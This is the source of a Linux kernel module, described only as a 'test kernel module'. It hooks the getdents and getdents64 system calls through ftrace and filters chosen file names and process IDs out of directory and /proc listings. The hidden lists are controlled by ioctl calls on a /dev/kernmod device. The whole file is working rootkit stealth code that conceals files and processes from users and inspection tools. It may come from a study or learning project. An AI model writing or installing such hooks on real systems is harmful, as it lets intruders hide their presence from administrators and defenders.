#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/uaccess.h>
#include <linux/fs.h>
#include <linux/miscdevice.h>
#include <linux/version.h>

#include "ftrace.h"
#include "common.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Ivan Briukhov");
MODULE_DESCRIPTION("test kernel module");

#define MAX_HIDDEN_ENTRIES 64
#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 12, 0)
#define FD_FILE(f) fd_file(f)
#else
#define FD_FILE(f) ((f).file)
#endif

struct hidden_file {
    char name[MAX_HIDDEN_NAME];
    struct list_head list;
};

struct hidden_pid {
    pid_t pid;
    struct list_head list;
};

static LIST_HEAD(hidden_files);
static LIST_HEAD(hidden_pids);
static int hidden_file_count = 0;
static int hidden_pid_count = 0;

// original syscalls
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
static asmlinkage long (*orig_getdents)(const struct pt_regs *);


// list control functions
static int kernmod_add_hidden_file(const char *name)
{
    struct hidden_file *entry;
    int err = 0;

    if (hidden_file_count >= MAX_HIDDEN_ENTRIES) {
        return -ENOMEM;
    }

    list_for_each_entry(entry, &hidden_files, list) {
        if (strcmp(entry->name, name) == 0) {
            return -EEXIST;
        }
    }

    entry = kmalloc(sizeof(*entry), GFP_KERNEL);
    if (!entry) {
        return -ENOMEM;
    }

    strscpy(entry->name, name, MAX_HIDDEN_NAME);
    list_add_tail(&entry->list, &hidden_files);
    hidden_file_count++;

    pr_info("kernmod: hiding file '%s'\n", name);

    return err;
}

static int kernmod_remove_hidden_file(const char *name)
{
    struct hidden_file *entry, *tmp;
    int err = -ENOENT;

    list_for_each_entry_safe(entry, tmp, &hidden_files, list) {
        if (strcmp(entry->name, name) == 0) {
            list_del(&entry->list);
            kfree(entry);
            hidden_file_count--;
            pr_info("kernmod: unhiding file '%s'\n", name);
            err = 0;
            return err;
        }
    }
    return err;  
}

static int kernmod_add_hidden_pid(pid_t pid)
{
    struct hidden_pid *entry;
    int err = 0;

    if (hidden_pid_count >= MAX_HIDDEN_ENTRIES) {
        return -ENOMEM;
    }

    list_for_each_entry(entry, &hidden_pids, list) {
        if (entry->pid == pid) {
            return -EEXIST;
        }
    }

    entry = kmalloc(sizeof(*entry), GFP_KERNEL);
    if (!entry) {
        return -ENOMEM;
    }

    entry->pid = pid;
    list_add_tail(&entry->list, &hidden_pids);
    hidden_pid_count++;

    pr_info("kernmod: hiding pid %d\n", pid);

    return err;
}

static int kernmod_remove_hidden_pid(pid_t pid)
{
    struct hidden_pid *entry, *tmp;
    int err = -ENOENT;

    list_for_each_entry_safe(entry, tmp, &hidden_pids, list) {
        if (entry->pid == pid) {
            list_del(&entry->list);
            kfree(entry);
            hidden_pid_count--;
            pr_info("kernmod: unhiding pid %d\n", pid);
            return 0;
        }
    }

    return err;
}

// helper functions for hooks
static bool is_proc_dir(unsigned int fd)
{
    struct fd f;
    bool result = false;

    f = fdget(fd);
    if (!FD_FILE(f))
        return false;

    if (FD_FILE(f)->f_path.dentry &&
        FD_FILE(f)->f_path.dentry->d_sb &&
        FD_FILE(f)->f_path.dentry->d_sb->s_type &&
        FD_FILE(f)->f_path.dentry->d_sb->s_type->name &&
        strcmp(FD_FILE(f)->f_path.dentry->d_sb->s_type->name, "proc") == 0)
    {
        if (FD_FILE(f)->f_path.dentry == FD_FILE(f)->f_path.dentry->d_sb->s_root)
            result = true;
    }

    fdput(f);
    return result;
}

static bool should_hide_dirent(const char *name, bool is_proc)
{
    bool result = false;
    if (is_proc) {
        long pid_num;
        struct hidden_pid *entry;

        if (kstrtol(name, 10, &pid_num) != 0)
            return false;

        list_for_each_entry(entry, &hidden_pids, list) {
            if (entry->pid == (pid_t)pid_num) {
                result = true;
                break;
            }
        }
    } else {
        struct hidden_file *entry;

        list_for_each_entry(entry, &hidden_files, list) {
            if (strcmp(entry->name, name) == 0) {
                result = true;
                break;
            }
        }
    }
    return result;
}

// hooks for syscalls
static asmlinkage long hook_getdents64(const struct pt_regs *regs)
{
    struct linux_dirent64 __user *user_dirent;
    struct linux_dirent64 *kern_dirent, *cur, *prev;
    unsigned int fd;
    long ret, new_ret;
    unsigned long offset;
    bool proc;

    ret = orig_getdents64(regs);
    if (ret <= 0)
        return ret;

    fd = (unsigned int)regs->di;
    user_dirent = (struct linux_dirent64 __user *)regs->si;

    proc = is_proc_dir(fd);

    if (!proc && list_empty(&hidden_files))
        return ret;
    if (proc && list_empty(&hidden_pids))
        return ret;

    kern_dirent = kvmalloc(ret, GFP_KERNEL);
    if (!kern_dirent)
        return ret;

    if (copy_from_user(kern_dirent, user_dirent, ret)) {
        kvfree(kern_dirent);
        return ret;
    }

    new_ret = ret;
    prev = NULL;
    offset = 0;

    while (offset < new_ret) {
        cur = (struct linux_dirent64 *)((char *)kern_dirent + offset);

        if (should_hide_dirent(cur->d_name, proc)) {
            pr_info("kernmod: filtering dirent: '%s'\n", cur->d_name);

            if (prev) {
                prev->d_reclen += cur->d_reclen;
            } else {
                new_ret -= cur->d_reclen;
                memmove(cur,
                        (char *)cur + cur->d_reclen,
                        new_ret - offset);
                continue;
            }
        } else {
            prev = cur;
        }

        offset += cur->d_reclen;
    }

    if (copy_to_user(user_dirent, kern_dirent, new_ret)) {
        kvfree(kern_dirent);
        return ret;
    }

    kvfree(kern_dirent);
    return new_ret;
}

struct linux_dirent {
    unsigned long d_ino;
    unsigned long d_off;
    unsigned short d_reclen;
    char d_name[];
};

static asmlinkage long hook_getdents(const struct pt_regs *regs)
{
    struct linux_dirent __user *user_dirent;
    struct linux_dirent *kern_dirent, *cur, *prev;
    unsigned int fd;
    long ret, new_ret;
    unsigned long offset;
    bool proc;

    ret = orig_getdents(regs);
    if (ret <= 0)
        return ret;

    fd = (unsigned int)regs->di;
    user_dirent = (struct linux_dirent __user *)regs->si;

    proc = is_proc_dir(fd);

    if (!proc && list_empty(&hidden_files))
        return ret;
    if (proc && list_empty(&hidden_pids))
        return ret;

    kern_dirent = kvmalloc(ret, GFP_KERNEL);
    if (!kern_dirent)
        return ret;

    if (copy_from_user(kern_dirent, user_dirent, ret)) {
        kvfree(kern_dirent);
        return ret;
    }

    new_ret = ret;
    prev = NULL;
    offset = 0;

    while (offset < new_ret) {
        cur = (struct linux_dirent *)((char *)kern_dirent + offset);

        if (should_hide_dirent(cur->d_name, proc)) {
            if (prev) {
                prev->d_reclen += cur->d_reclen;
            } else {
                new_ret -= cur->d_reclen;
                memmove(cur,
                        (char *)cur + cur->d_reclen,
                        new_ret - offset);
                continue;
            }
        } else {
            prev = cur;
        }

        offset += cur->d_reclen;
    }

    if (copy_to_user(user_dirent, kern_dirent, new_ret)) {
        kvfree(kern_dirent);
        return ret;
    }

    kvfree(kern_dirent);
    return new_ret;
}

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
    HOOK("__x64_sys_getdents",   hook_getdents,   &orig_getdents),
};

// ioctl handler
static long kernmod_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
{
    char buf[MAX_HIDDEN_NAME] = {0};
    long pid_num;

    switch (cmd) {
    case IOCTL_HIDE_FILE:
        if (copy_from_user(buf, (char __user *)arg, MAX_HIDDEN_NAME))
            return -EFAULT;
        buf[MAX_HIDDEN_NAME - 1] = '\0';
        return kernmod_add_hidden_file(buf); 

    case IOCTL_UNHIDE_FILE:
        if (copy_from_user(buf, (char __user *)arg, MAX_HIDDEN_NAME))
            return -EFAULT;
        buf[MAX_HIDDEN_NAME - 1] = '\0';
        return kernmod_remove_hidden_file(buf);
    
    case IOCTL_HIDE_PID:
        if (copy_from_user(buf, (char __user *)arg, MAX_PID_STR))
            return -EFAULT;
        buf[MAX_PID_STR - 1] = '\0';
        if (kstrtol(buf, 10, &pid_num) != 0)
            return -EINVAL;
        return kernmod_add_hidden_pid((pid_t)pid_num);

    case IOCTL_UNHIDE_PID:
        if (copy_from_user(buf, (char __user *)arg, MAX_PID_STR))
            return -EFAULT;
        buf[MAX_PID_STR - 1] = '\0';
        if (kstrtol(buf, 10, &pid_num) != 0)
            return -EINVAL;
        return kernmod_remove_hidden_pid((pid_t)pid_num);
    
    default:
        return -EINVAL;
    }
}

static const struct file_operations kernmod_fops = {
    .owner = THIS_MODULE,
    .unlocked_ioctl = kernmod_ioctl,
};

static struct miscdevice kernmod_dev = {
    .minor = MISC_DYNAMIC_MINOR,
    .name = "kernmod",
    .fops = &kernmod_fops,
    .mode = 0660,
};

// init / exit
static int __init kernmod_init(void)
{
    int err;

    err = misc_register(&kernmod_dev);
    if (err) {
        pr_err("kernmod: misc_register failed: %d\n", err);
        return err;
    }

    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err) {
        pr_err("kernmod: fh_install_hooks failed: %d\n", err);
        misc_deregister(&kernmod_dev);
        return err;
    }

    pr_info("kernmod: module loaded\n");
    return 0;
}

static void __exit kernmod_exit(void)
{
    struct hidden_file *fentry, *ftmp;
    struct hidden_pid *pentry, *ptmp;

    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));

    list_for_each_entry_safe(fentry, ftmp, &hidden_files, list) {
        list_del(&fentry->list);
        kfree(fentry);
    }

    list_for_each_entry_safe(pentry, ptmp, &hidden_pids, list) {
        list_del(&pentry->list);
        kfree(pentry);
    }

    misc_deregister(&kernmod_dev);

    pr_info("kernmod: module unloaded\n");
}

module_init(kernmod_init);
module_exit(kernmod_exit);